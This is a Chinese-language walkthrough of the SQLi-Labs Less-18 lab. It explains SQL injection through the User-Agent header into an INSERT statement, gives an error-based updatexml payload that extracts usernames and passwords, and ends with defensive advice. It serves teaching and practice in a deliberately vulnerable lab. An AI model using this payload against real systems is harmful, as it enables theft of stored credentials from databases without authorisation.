## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：中等
- 通关标识：识别出注入点在 HTTP 请求头的 `User-Agent` 字段，利用 `updatexml` 触发报错注入。

## 二、大白话原理讲解
前面十几关，咱们都是在网页的输入框里跟柜员（数据库）打交道。到了这一关，输入框变成了“铜墙铁壁”，你把键盘敲烂它也不报错。

因为真正的漏洞藏在了“暗处”——**HTTP 请求头里的 `User-Agent`**。
后台的代码大概是这么写的：当你登录成功后，为了记录你的浏览器信息，它会把你的 `User-Agent` 直接塞进数据库的日志表里。
`INSERT INTO uagents (uagent, ip, username) VALUES ('$uagent', '$ip', '$username')`

因为后台没有对这个 `$uagent` 做任何过滤，我们就可以通过抓包修改 `User-Agent`，把“碰瓷”的咒语塞进去，让它报错，从而把数据喊出来。

## 三、解题步骤

**1. 正常登录并抓包**
*   在登录框输入 `admin` / `admin`，点击登录。
*   用 Burp Suite 拦截请求，找到 `User-Agent` 字段。

**2. 构造 Payload 触发报错**
把 `User-Agent` 的值改成：
```text
Mozilla/5.0' AND updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1), 1, 1) #
```
*(注：因为后台的 `INSERT` 语句有 3 列，我们需要在 `updatexml` 后面加 `, 1, 1)` 补齐列数)*

**3. 验证结果**
放行请求后，页面会出现类似报错：
`Truncated incorrect DOUBLE value: 'Mozilla/5.0'`
或
`XPATH syntax error: '~Dumb:Dumb~'`
这意味着你的 Payload 已成功执行，`updatexml` 提取出的账号密码被当作错误信息带出。由于 MySQL 的 `updatexml` 报错长度限制，数据常会被截断，但核心信息已成功提取。

## 四、知识点解析
1. **Header 注入**：注入点不仅存在于表单参数，还存在于 HTTP 请求头（如 `User-Agent`、`Referer`、`Cookie`、`X-Forwarded-For` 等）。
2. **INSERT 语句注入**：这关的底层是 `INSERT` 语句，注入时需要补齐后面的列数，以保证 SQL 语法不崩。
3. **报错信息截断**：`updatexml` 和 `extractvalue` 报错回显的字符数通常有限制，可以使用 `substr` 或 `limit` 分段获取。

## 五、总结与防御
**本题总结**：
Less-18 标志着注入点从“显式参数”转向了“隐式请求头”。只要页面会记录你的请求头，并且没做过滤，这里就是突破口。

**安全防御建议**：
- **过滤所有输入**：HTTP 请求头同样需要严格的过滤和校验，不能只防表单参数。
- **关闭报错回显**：生产环境关闭错误回显，避免通过报错泄露数据。
